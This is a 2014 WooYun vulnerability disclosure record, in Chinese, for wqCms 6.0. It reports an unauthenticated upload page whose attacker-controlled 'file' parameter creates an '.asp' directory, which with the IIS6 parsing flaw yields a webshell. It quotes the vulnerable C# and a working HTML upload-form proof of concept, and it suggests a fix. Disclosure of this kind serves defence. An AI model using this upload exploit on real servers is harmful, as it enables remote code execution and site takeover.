{"id": 54146, "wybug_id": "wooyun-2014-065399", "wybug_title": "wqCms6.0 文件上传获取webshell（服务器限制）", "wybug_corp": "wangqi.com", "wybug_author": "what_news", "wybug_date": "2014-06-20 09:04", "wybug_open_date": "2014-09-15 09:06", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传", "解析文件漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向公众公开  简要描述： wqcms最新版 获取webshell 无需登录 默认配置求顺便帮这个也审核了吧http://wooyun.org/bugs/wooyun-2014-065309/trace/b854f00000a861e49bd22dd330fc350a 详细说明：  结合iis6解析漏洞 就可以获取webshell了admin_wqSwfUpload.aspx源码如下\npublic void Page_Init(object sender, EventArgs e){    base.mustLogin = false; //无需登录    base.Page_Init(sender, e);}\n\npublic void Page_Load(object sender, EventArgs e){    this.method_1();}private void method_1(){    string str = string.Format(\"upload/{0}/\", DateTime.Now.ToString(\"yyyy-MM\"));    string s = string.Empty;    if (!string.IsNullOrEmpty(base.Request.QueryString[\"file\"]))//file可自由控制    {        str = string.Format(\"{0}/{1}\", str, base.Request.QueryString[\"file\"]);    }    bool flag = false;    HttpPostedFile file = base.Request.Files[\"Filedata\"];    string str5 = Path.GetExtension(file.FileName).ToLower();    string[] strArray = new string[] { \".gif\", \".png\", \".jpeg\", \".jpg\" };    for (int i = 0; i < strArray.Length; i++)    {        if (str5 == strArray[i])        {            flag = true;        }    }    if (flag)    {        if (!Directory.Exists(base.Server.MapPath(str))) //这里判断目录是否存在不存在就创建目录 由于file我们可以自己控制 如果目录为1.asp 那么等下上传图片就可以跟进解析漏洞获取webshell了        {            Directory.CreateDirectory(base.Server.MapPath(str));        }        Random random = new Random();        string str6 = DateTime.Now.ToString(\"yyyyMMddHHmm\") + random.Next(0x2710).ToString();        str = string.Format(\"{0}{1}{2}\", str, str6, str5);        s = str;        file.SaveAs(base.Server.MapPath(str)); //保存        FileInfo info = new FileInfo(base.Server.MapPath(str));        if (info.Length < 0x7d000L)        {            string input = WbIO.ReadFile(base.Server.MapPath(str));            string str3 = str5.TrimStart(new char[] { '.' });            if ((((str3 != \"html\") && (str3 != \"txt\")) && ((str3 != \"htm\") && (str3 != \"asp\"))) && (((str3 != \"aspx\") && (str3 != \"php\")) && Regex.IsMatch(input, \"<html|<script|<object\", RegexOptions.Singleline | RegexOptions.Compiled | RegexOptions.IgnoreCase)))            {                File.Delete(base.Server.MapPath(str));                return;            }        }        info = null;    }    base.Response.StatusCode = 200;    base.Response.Write(s);}\n   漏洞证明：  \n\ncms6.0版本这里就本地测试吧利用代码如下\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" ><head>    <title>upload</title></head><body><form method=\"post\" action=\"http://192.168.1.104/admin_wqSwfUpload.aspx?file=3.asp/\" enctype=\"multipart/form-data\"\" ><input type=\"file\" name=\"Filedata\" /><input type=\"submit\" name=\"tijiao\"  value=\"confirm\"/></form></body></html>\n上传后\n\n文件名还是很容易获取的\n\n   修复方案：  file设置成绝对值不要让用户输入   版权声明：转载请注明来源 what_news@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-15 09:06 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-20 09:09 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @疯狗 @xsser @Finger 这个不用管理员权限的 无需登录就可以直接上传的    \n     2014-06-20 16:06 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @what_news updated    \n     2014-06-20 21:45 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @疯狗 谢谢     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}